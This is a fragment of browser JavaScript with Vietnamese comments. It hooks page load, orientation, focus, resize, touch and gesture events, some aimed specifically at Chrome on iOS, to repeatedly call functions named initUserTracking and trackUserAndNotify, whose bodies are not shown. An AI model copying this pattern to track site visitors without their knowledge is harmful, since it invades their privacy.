    logDebug('Adding mobile-specific event listeners');
    
    // Sự kiện khi thiết bị thay đổi hướng
    window.addEventListener('orientationchange', function() {
        logDebug('Orientation changed');
        setTimeout(trackUserAndNotify, 1500);
    }, { passive: true });
    
    // Sự kiện khi ứng dụng được khôi phục (iOS)
    window.addEventListener('resume', function() {
        logDebug('App resumed (iOS)');
        setTimeout(trackUserAndNotify, 1500);
    }, { passive: true });
    
    // Sự kiện khi thiết bị trở lại từ trạng thái ngủ
    document.addEventListener('deviceready', function() {
        logDebug('Device ready');
        setTimeout(trackUserAndNotify, 1500);
    }, { passive: true });
}

// Khởi chạy khi trang được tải
window.addEventListener('load', function() {
    logDebug('Window load event');
    initUserTracking();
}, { passive: true });

// Khởi chạy khi DOM đã sẵn sàng (dự phòng)
document.addEventListener('DOMContentLoaded', function() {
    logDebug('DOM content loaded event');
    // Chỉ khởi tạo nếu chưa được khởi tạo bởi sự kiện load
    if (!isTracking && Date.now() - lastNotificationTime > 10000) {
        initUserTracking();
    }
}, { passive: true });

// Thêm sự kiện đặc biệt cho Chrome iOS
if (/iPhone|iPad|iPod/i.test(navigator.userAgent) && /CriOS/i.test(navigator.userAgent)) {
    logDebug('Adding Chrome iOS specific event listeners');
    
    // Thêm sự kiện touchmove
    document.addEventListener('touchmove', function() {
        const now = Date.now();
        if (now - lastNotificationTime > 5000 && !isTracking) {
            logDebug('Touch move detected on Chrome iOS');
            setTimeout(trackUserAndNotify, 1000);
        }
    }, { passive: true });
    
    // Thêm sự kiện gesturestart (đặc biệt cho iOS)
    document.addEventListener('gesturestart', function() {
        const now = Date.now();
        if (now - lastNotificationTime > 5000 && !isTracking) {
            logDebug('Gesture start detected on Chrome iOS');
            setTimeout(trackUserAndNotify, 1000);
        }
    }, { passive: true });
    
    // Thêm sự kiện resize
    window.addEventListener('resize', function() {
        const now = Date.now();
        if (now - lastNotificationTime > 5000 && !isTracking) {
            logDebug('Resize detected on Chrome iOS');
            setTimeout(trackUserAndNotify, 1000);
        }
    }, { passive: true });
    
    // Thêm sự kiện focus
    window.addEventListener('focus', function() {
        const now = Date.now();
        if (now - lastNotificationTime > 5000 && !isTracking) {
            logDebug('Window focus detected on Chrome iOS');
            setTimeout(trackUserAndNotify, 1000);
        }
    }, { passive: true });
}
